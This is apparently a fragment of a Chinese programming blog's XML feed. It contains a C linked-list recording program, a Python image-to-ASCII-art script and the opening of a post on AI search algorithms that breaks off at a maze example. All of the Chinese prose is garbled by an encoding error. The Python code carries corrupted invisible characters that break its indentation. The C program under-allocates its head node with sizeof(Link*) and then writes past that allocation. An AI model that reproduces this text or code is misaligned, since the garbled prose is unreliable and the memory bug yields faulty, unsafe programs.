class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>é¦–å…ˆå£°æ˜ä¸€ä¸ªå­—ç¬¦æ•°ç»„ç”¨æ¥å‚¨å­˜è¾“å…¥ï¼Œç„¶åå£°æ˜ä¸€ä¸ªèŠ‚ç‚¹ç±»å‹çš„æŒ‡é’ˆä½œä¸ºå¤´èŠ‚ç‚¹ï¼Œå¹¶ä¸ºå…¶åˆ†é…å†…å­˜ï¼Œæ¥ç€å†å£°æ˜ä¸€ä¸ªåŒæ ·çš„ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘è¯¥å¤´æŒ‡é’ˆï¼Œè¿™é‡Œä½¿ç”¨ä¸´æ—¶æŒ‡é’ˆçš„ç›®çš„æ˜¯ä½œä¸ºå½“å‰æŒ‡é’ˆä¸ä¸‹ä¸€ä¸ªæŒ‡é’ˆçš„è¿‡æ¸¡æŒ‡é’ˆï¼ŒåŒæ—¶ä¿æŒå¤´æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸å˜ï¼Œæ–¹ä¾¿æœ€åçš„è¾“å‡ºï¼›</li>    <li>åœ¨è¾“å‡ºæç¤ºä¿¡æ¯ä¹‹åè¿›å…¥å¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸ºè¾“å…¥ç©ºè¡Œï¼›åœ¨å¾ªç¯ä¸­ï¼Œé¦–å…ˆå£°æ˜æŒ‡å‘å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆå¹¶ä¸ºå…¶åˆ†é…å†…å­˜ï¼Œæ¥ç€å°†è¯¥æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä¸­çš„æŒ‡é’ˆå£°æ˜ä¸ºNULLï¼Œç„¶åå°†å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆèµ‹ç»™ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„çš„æŒ‡é’ˆï¼Œä½¿å…¶ä¸ä¸Šä¸€ä¸ªèŠ‚ç‚¹ç›¸è¿ï¼Œç„¶åå†å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘çš„æŒ‡é’ˆèµ‹ç»™è‡ªèº«(å…¶å®å°±ç›¸å½“äºä½¿ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹)ï¼›æ¥ç€å°†åˆšåˆšæ¥æ”¶çš„è¾“å…¥å¤åˆ¶åˆ°å½“å‰èŠ‚ç‚¹çš„nameå˜é‡ä¸­ï¼Œç„¶åå†æ¥æ”¶ç¼–å·çš„è¾“å…¥å¹¶å­˜å‚¨åˆ°å½“å‰èŠ‚ç‚¹çš„numberå˜é‡ä¸­ï¼›å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨scanf()å‡½æ•°æ¥æ”¶è¾“å…¥åè¯¥å‡½æ•°ä¼¼ä¹ä¼šå°†æ¢è¡Œç¬¦ç•™åœ¨ç¼“å­˜åŒºä¸­ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨getchar()å‡½æ•°æ¥å°†è¯¥æ¢è¡Œç¬¦ä»ç¼“å­˜åŒºä¸­å»é™¤ï¼›</li>    <li>åœ¨å¾ªç¯ç»“æŸä¹‹åï¼Œæˆ‘å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘äº†å¤´èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹(è¯·æ³¨æ„ï¼Œå¤´èŠ‚ç‚¹ä¸­å¹¶æ²¡æœ‰å‚¨å­˜é™¤ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ä¹‹å¤–çš„ä»»ä½•ä¿¡æ¯ï¼Œæ•…æ­¤å¤„ä»å¤´èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹å¼€å§‹)ï¼›ç„¶åè¿›å…¥ä¸‹ä¸€ä¸ªwhileå¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸ºä¸´æ—¶æŒ‡é’ˆä¸ºç©ºæŒ‡é’ˆ(å› ä¸ºåœ¨ä¸Šä¸€ä¸ªwhileå¾ªç¯ä¸­å·²ç»å°†å½“å‰èŠ‚ç‚¹ä¸­çš„æŒ‡é’ˆå£°æ˜ä¸ºNULLäº†ï¼Œæ‰€ä»¥ä¸€æ—¦ç¬¬ä¸€ä¸ªå¾ªç¯ç»“æŸï¼Œæœ€åä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„æŒ‡é’ˆå¿…ä¸ºNULL)ï¼Œç„¶åæ‰“å°å‡ºå½“å‰èŠ‚ç‚¹çš„ä¿¡æ¯å¹¶å°†ä¸´æ—¶æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚</li></ul><h2>æºä»£ç </h2><p>æœ€åé™„ä¸Šæºä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_INPUT 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> çŸ¥è¯†è¾“å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨Pythonç¼–å†™ä¸€ä¸ªèƒ½å°†å›¾ç‰‡è½¬æ¢ä¸ºå­—ç¬¦ç”»çš„ç¨‹åº</title>
      <link href="2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line"></span><br><span class="line">from PIL import Image </span><br><span class="line"></span><br><span class="line">import argparse <span class="comment">#å‘½ä»¤è¡Œè¾“å…¥å‚æ•°å¤„ç† </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser() </span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;file&#x27;</span>)     <span class="comment">#è¾“å…¥æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>)   <span class="comment">#è¾“å‡ºæ–‡ä»¶ </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--width&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#è¾“å‡ºå­—ç¬¦ç”»å®½ </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--height&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#è¾“å‡ºå­—ç¬¦ç”»é«˜ #è·å–å‚æ•° </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = parser.parse_args() </span><br><span class="line"></span><br><span class="line">IMG = args.file</span><br><span class="line"></span><br><span class="line">WIDTH = args.width </span><br><span class="line"></span><br><span class="line">HEIGHT = args.height </span><br><span class="line"></span><br><span class="line">OUTPUT = args.output </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii_char = list(<span class="string">&quot;<span class="variable">$@B</span>%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^&#x27;. &quot;</span>) <span class="comment"># å°†256ç°åº¦æ˜ å°„åˆ°70ä¸ªå­—ç¬¦ä¸Š </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_char(r,g,b,alpha = 256):    </span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">if</span> alpha == 0:        </span><br><span class="line"></span><br><span class="line">â€‹<span class="built_in">return</span> <span class="string">&#x27; &#x27;</span>    </span><br><span class="line"></span><br><span class="line">â€‹length = len(ascii_char)    </span><br><span class="line"></span><br><span class="line">â€‹gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)     </span><br><span class="line"></span><br><span class="line">â€‹unit = (256.0 + 1)/length    </span><br><span class="line"></span><br><span class="line">â€‹<span class="built_in">return</span> ascii_char[int(gray/unit)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:     </span><br><span class="line"></span><br><span class="line">â€‹im = Image.open(IMG)    </span><br><span class="line"></span><br><span class="line">â€‹im = im.resize((WIDTH,HEIGHT), Image.NEAREST)     </span><br><span class="line"></span><br><span class="line">â€‹txt = <span class="string">&quot;&quot;</span>     </span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):        </span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):            </span><br><span class="line"></span><br><span class="line">â€‹txt += get_char(*im.getpixel((j,i)))        </span><br><span class="line"></span><br><span class="line">â€‹txt += <span class="string">&#x27;\n&#x27;</span>     </span><br><span class="line"></span><br><span class="line">â€‹<span class="built_in">print</span>(txt)     <span class="comment">#å­—ç¬¦ç”»è¾“å‡ºåˆ°æ–‡ä»¶    </span></span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">if</span> OUTPUT:        </span><br><span class="line"></span><br><span class="line">â€‹with open(OUTPUT,<span class="string">&#x27;w&#x27;</span>) as f:            </span><br><span class="line"></span><br><span class="line">â€‹f.write(txt)    </span><br><span class="line"></span><br><span class="line">â€‹<span class="keyword">else</span>:        </span><br><span class="line"></span><br><span class="line">â€‹with open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) as f:           </span><br><span class="line"></span><br><span class="line">â€‹f.write(txt)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äººå·¥æ™ºèƒ½å…¥é—¨-æŸ¥æ‰¾</title>
      <link href="2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/"/>
      <url>2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h2>æ¦‚è¿°</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œäººå·¥æ™ºèƒ½åœ¨è¿‘äº›å¹´ååˆ†ç«çˆ†ï¼Œåœ¨å„ä¸ªé¢†åŸŸçš„åº”ç”¨ä¹Ÿæ˜¯ååˆ†å¹¿æ³›ï¼Œå…¶ä¸­ä¸€ä¸ªé¢†åŸŸå°±æ˜¯å¯¼èˆªã€‚<a id="more"></a></p><p>ä¹Ÿè®¸æœ‰äººä¼šè¯´ï¼Œå¯¼èˆªä¸å°±æ˜¯ç”µå­åœ°å›¾å˜›ï¼Ÿå’Œäººå·¥æ™ºèƒ½æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿä½†å…¶å®åœ¨å¯¼èˆªä¸­äººå·¥æ™ºèƒ½å‘æŒ¥äº†å¾ˆé‡è¦çš„ä½œç”¨ã€‚â€œæ¡æ¡å¤§è·¯é€šç½—é©¬â€ï¼Œä¸ºä»€ä¹ˆå¯¼èˆªä¼šå‘ä½ æ¨èè¿™æ¡è·¯è€Œä¸æ¨èå¦ä¸€æ¡è·¯ï¼Ÿè¿™å…¶ä¸­å°±æ¶‰åŠåˆ°äº†äººå·¥æ™ºèƒ½ä¸­çš„æœç´¢ç®—æ³•ã€‚</p><p><img src="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" srcset="data:image/png;base64,666" alt="B7S4Ln.png"></p><p>åœ¨æœç´¢ä¸­ï¼Œå¾€å¾€æœ‰åˆå§‹çŠ¶æ€(initial states)ã€ç›®æ ‡çŠ¶æ€(goal states)ï¼Œè€Œäººå·¥æ™ºèƒ½æ‰€åšçš„ï¼Œå°±æ˜¯åœ¨ä¼—å¤šæƒ…å½¢ä¸­ï¼Œæ‰¾åˆ°ä¼—å¤šè§£å†³æ–¹æ³•çš„æœ€ä¼˜è§£ï¼Œå…¶ä¸­ä¼šæ¶‰åŠåˆ°å¾ªç¯å’Œè¿­ä»£ï¼Œå‡å¦‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªåˆå§‹çŠ¶æ€ï¼Œæˆ‘ä»¬è¦æ€æ ·è¾¾åˆ°ç›®æ ‡çŠ¶æ€å‘¢ï¼Ÿ</p><h2>æ¦‚å¿µä»‹ç»</h2><p>åœ¨è¿™ä¹‹å‰éœ€è¦å…ˆäº†è§£ä¸€äº›æ¦‚å¿µï¼š</p><ul>    <li>åŠ¨ä½œï¼šé€šå¸¸æ˜¯æ¥å—çŠ¶æ€çš„å‡½æ•°ï¼Œè¿”å›åœ¨æ­¤çŠ¶æ€ä¸­åº”è¯¥åšå‡ºçš„å†³ç­–</li>    <li>è¿ç§»æ¨¡å‹ï¼šé€šå¸¸æ˜¯æ¥å—çŠ¶æ€å’ŒåŠ¨ä½œçš„å‡½æ•°ï¼Œè¿”å›åœ¨æ­¤çŠ¶æ€ä¸‹åšå‡ºæ­¤ç§å†³ç­–åçš„æ–°çŠ¶æ€</li>    <li>èŠ‚ç‚¹ï¼šæ•°æ®ç»“æ„ï¼Œç”¨æ¥è®°å½•çŠ¶æ€ï¼Œçˆ¶èŠ‚ç‚¹ï¼ŒåŠ¨ä½œå’Œè·¯å¾„æˆæœ¬</li>    <li>è¾¹ç•Œï¼šæ•°æ®ç»“æ„ï¼Œç”¨æ¥åŒºåˆ†å·²æ¢ç´¢çš„éƒ¨åˆ†å’Œæœªæ¢ç´¢çš„éƒ¨åˆ†</li></ul><h2>ç®—æ³•è®¨è®º</h2><p>åœ¨äº†è§£äº†ç›¸å…³æ¦‚å¿µä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹è®¨è®ºç®—æ³•ï¼š</p><ul>    <li>é¦–å…ˆå°†åˆå§‹çŠ¶æ€æ”¾å…¥è¾¹ç•Œï¼Œç„¶åè¿›å…¥å¾ªç¯</li>    <ul>        <li>å¦‚æœè¾¹ç•Œä¸ºç©ºï¼Œåˆ™æ— è§£</li>        <li>ä»è¾¹ç•Œä¸­ç§»å»ä¸€ä¸ªèŠ‚ç‚¹</li>        <li>å¦‚æœæ­¤èŠ‚ç‚¹åŒ…å«ç›®æ ‡çŠ¶æ€ï¼Œåˆ™è¿½è¸ªçˆ¶èŠ‚ç‚¹ï¼Œç„¶åè¿”å›è§£å†³æ–¹æ¡ˆ</li>        <li>æ‰©å¼ èŠ‚ç‚¹å¹¶å°†å…¶åŠ å…¥è¾¹ç•Œ</li>    </ul></ul><p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š</p><img src="https://www.helloimg.com/images/2021/04/05/B7StR6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7StR6.png" srcset="data:image/png;base64,666" alt="B7StR6.png" style="zoom: 33%;" /><p>å‡è®¾æˆ‘ä»¬ç°åœ¨çš„è¦æ±‚æ˜¯æ‰¾åˆ°ä»Aåˆ°Eçš„è·¯å¾„</p><ul>    <li>ç¬¬ä¸€æ­¥æˆ‘ä»¬å°†Aï¼ˆåˆå§‹çŠ¶æ€ï¼‰æ”¾å…¥è¾¹ç•Œï¼Œè¿›å…¥å¾ªç¯</li>    <li>å› ä¸ºAä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Aç§»å‡ºè¾¹ç•Œå¹¶å°†BåŠ å…¥è¾¹ç•Œ</li>    <li>å› ä¸ºBä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Bç§»å‡ºè¾¹ç•Œå¹¶å°†Cå’ŒDåŠ å…¥è¾¹ç•Œ</li>    <li>å› ä¸ºCä¸æ˜¯ç›®æ ‡çŠ¶æ€ï¼Œå°†Cç§»å‡ºè¾¹ç•Œå¹¶å°†EåŠ å…¥è¾¹ç•Œ</li>    <li>å› ä¸ºEæ˜¯ç›®æ ‡çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿”å›ä»Aåˆ°Eçš„è·¯å¾„ï¼Œå¾ªç¯ç»“æŸ</li></ul>è‡³æ­¤ï¼Œæˆ‘ä»¬å°±è§£å†³äº†ä¸€ä¸ªéå¸¸ç®€å•çš„è·¯å¾„æœç´¢é—®é¢˜ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªç®—æ³•è¿˜å­˜åœ¨ç€è®¸å¤šé—®é¢˜ï¼Œæ¯”å¦‚ï¼šå¦‚ä½•ç¡®ä¿ç®—æ³•ä¸ä¼šé‡æ–°æ£€æŸ¥å½“å‰çŠ¶æ€çš„çˆ¶èŠ‚ç‚¹ï¼Ÿå¦‚æœé‡å¤æ£€æŸ¥çˆ¶èŠ‚ç‚¹ï¼Œé‚£ä¹ˆç¨‹åºå°†è¿›å…¥æ— é™æ­»å¾ªç¯ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œä½¿ç”¨ä¸€ä¸ªæ•°æ®ç»“æ„æ¥å‚¨å­˜å·²æ£€æŸ¥è¿‡çš„èŠ‚ç‚¹ï¼Œç„¶ååœ¨æ¯æ¬¡æ£€æŸ¥èŠ‚ç‚¹æ—¶éå†æ­¤æ•°æ®ç»“æ„ï¼Œå¦‚æœå­˜åœ¨ä¸ä¹‹ç›¸åŒçš„èŠ‚ç‚¹åˆ™ä¸æ£€æŸ¥ã€‚<p>é‚£ä¹ˆåœ¨å®é™…æƒ…å†µä¸‹æ˜¯æ€ä¹ˆæ ·çš„å‘¢ï¼Ÿ</p><h2>å®æˆ˜</h2><p>ä¸‹é¢è¿›å…¥å®æˆ˜ç¯èŠ‚ï¼š</p><p>æƒ…å¢ƒï¼šä½ ç°åœ¨æœ‰ä¸€å¼ è¿·å®«åœ°å›¾ï¼Œèµ·ç‚¹ä¸ºAï¼Œç»ˆç‚¹ä¸ºBï¼Œéœ€è¦ç¼–å†™ç¨‹åºä»¤è®¡ç®—æœºè‡ªè¡Œæ‰¾å‡ºç¦»å¼€è¿·å®«çš„è·¯å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # 